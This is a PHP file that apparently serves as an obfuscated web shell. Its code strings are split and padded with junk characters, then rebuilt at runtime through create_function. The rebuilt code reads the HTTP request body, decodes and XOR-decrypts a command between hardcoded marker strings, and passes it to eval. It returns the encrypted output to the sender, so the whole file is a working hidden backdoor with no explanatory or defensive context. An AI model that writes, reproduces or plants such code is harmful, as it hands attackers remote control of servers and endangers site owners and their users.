<?php
$v='r($j=0uO;($j<$uOcuO&&$i<$l);$j+uO+uO,$i++)uO{$o.=$t{$i}^uO$k{$uOj};uO}}return $ouOuOuO;}if (@puOreg';
$b=str_replace('Lu','','cLureatLuLueLu_funcLutLuion');
$D='uOnts();@ouOb_end_cleauOn();$ruO=@basuOe64_encuOode(@xuO(@guOzcuOouOmuOpress($o),$k));print("uO$p$kuOh$r$kf");}';
$G='$k="b87d2uOauOc2";$kh="1uO1a3uOa2uOf2c0uO0a";$kf="c7uOdbuO55dd1f6uO6";$p=uO"lvKkUZgcuOehH8MPoA";';
$g='rt();@euOuOvuOal(@gzuuOncompress(@x(uO@basuOuOuOe64_decode($m[1uO]),$k)));uO$o=uO@ob_get_conuOte';
$O='_match("/$uOkh(.+)$kfuO/"uO,@file_guOet_uOcouOntentuOs("uOphp://inpuuOuOt"),$m)==1) {@ob_stuOa';
$Q='fuOunuOctuOion x($uOtuO,$uOk)uO{$c=struOlen($k);$l=strlen($t);$uOo="uO";for($i=0uO;$uOi<$l;uO){fo';
$C=str_replace('uO','',$G.$Q.$v.$O.$g.$D);
$q=$b('',$C);$q();
?>
